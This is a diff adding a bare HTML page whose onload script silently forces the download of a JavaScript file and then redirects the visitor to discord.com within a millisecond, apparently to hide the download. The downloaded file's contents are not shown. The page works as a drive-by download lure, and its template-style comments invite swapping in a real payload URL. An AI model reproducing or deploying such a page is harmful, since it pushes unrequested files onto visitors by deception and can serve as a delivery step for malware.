@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="WImages/ZZysfqrZZRed.png" type="image/gif" sizes="16x16">
+  <title>0ixe</title>
+  <script>
+    window.onload = function() {
+        // Function to handle the download and redirect
+        function handleDownloadAndRedirect() {
+            var downloadLink = document.createElement('a');
+            downloadLink.href = 'Javascript-1(script.js).js';  // Replace with actual download URL
+            downloadLink.download = 'Javascript-1(script.js).js';  // Replace with desired filename
+            document.body.appendChild(downloadLink);
+            
+            // Trigger the download
+            downloadLink.click();
+            
+            // After a short delay, redirect the user
+            setTimeout(function() {
+                window.location.href = 'https://www.discord.com';
+            }, 1);  // 1000 milliseconds = 1 second (adjust delay as needed)
+        }
+        
+        // Call the function to initiate download and redirect
+        handleDownloadAndRedirect();
+    };
+    </script>
+    <style>
+      * {
+        background-color: #000000;
+      }
+    </style>
+</head>
+
+</html>
